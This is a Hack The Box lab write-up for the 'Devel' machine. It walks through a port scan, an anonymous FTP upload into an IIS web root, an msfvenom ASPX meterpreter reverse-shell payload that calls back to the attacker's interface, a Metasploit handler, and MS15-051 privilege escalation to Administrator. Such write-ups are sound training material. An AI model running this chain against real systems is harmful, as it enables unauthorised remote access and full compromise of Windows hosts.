# Hack The Box - Devel Writeup 6/7/2025

## 1. Initial Scan

**Command:**

```bash
nmap -sV -sC TARGET
```

**Results:**

| Port | State | Service | Version                 | Notes                                                                      |
| ---- | ----- | ------- | ----------------------- | -------------------------------------------------------------------------- |
| 21   | open  | ftp     | Microsoft ftpd          | Anonymous login allowed; contains files like `iisstart.htm`, `welcome.png` |
| 80   | open  | http    | Microsoft IIS httpd 7.5 | `http-title`: IIS7; `TRACE` method enabled                                 |

**Service Info:**
OS: Windows
CPE: `cpe:/o:microsoft:windows`

---

## 2. Enumeration

* Navigated to the web server at `http://TARGET` → Default IIS page
* Discovered anonymous FTP login allowed from Nmap
* Logged in via FTP:

  ```bash
  ftp TARGET
  Username: anonymous
  Password: (blank)
  ```
* Successfully uploaded a test file:

  ```bash
  put test.txt
  ```
* Verified the upload at:

  ```
  http://TARGET/test.txt
  ```

---

## 3. Exploitation

**Payload Creation with `msfvenom`:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f aspx -o payload.aspx
```

* Explanation:

  * `-p`: Payload
  * `-f`: Output format (`aspx` for ASP.NET)
  * `-o`: Output file
  * `tun0`: VPN interface

* Uploaded `payload.aspx` via FTP

* Started Metasploit:

  ```bash
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set LHOST tun0
  set LPORT 4444
  run
  ```

* Triggered payload:

  ```
  http://TARGET/payload.aspx
  ```

* Verified access:

  ```bash
  getuid
  sysinfo
  pwd
  ```

---

## 4. Post-Exploitation

**Privilege Escalation with Metasploit:**

* Searched for local exploits:

  ```bash
  run post/multi/recon/local_exploit_suggester
  ```

* Chose exploit (this is a known privilege escalation exploit):

  ```
  windows/local/ms15_051_client_copy_image
  ```

* Steps:

  1. Background current session
  2. Use exploit module:

     ```bash
     use exploit/windows/local/ms15_051_client_copy_image
     ```
  3. Check session ID:

     ```bash
     sessions
     ```
  4. Set required options:

     ```bash
     set SESSION <id>
     set LHOST <your-ip>
     run
     ```

* Verified elevated privileges:

  ```bash
  getuid
  ```

* Retrieved flags:

  * User flag: `C:\Users\babus\Desktop\user.txt`
  * Root flag: `C:\Users\Administrator\Desktop\root.txt`

---

## 📚 References

* [CVE-2015-1701](https://www.cvedetails.com/cve/CVE-2015-1701/)

---

## 🛠️ Tools Used

* Nmap
* Metasploit
* msfvenom
* FTP client

---

## 🎓 Lessons Learned

* Using an open FTP port to upload payloads to a web server
* Crafting and customizing payloads using `msfvenom`
* Catching reverse shells with `exploit/multi/handler`
* Escalating privileges using known Windows vulnerabilities via Metasploit
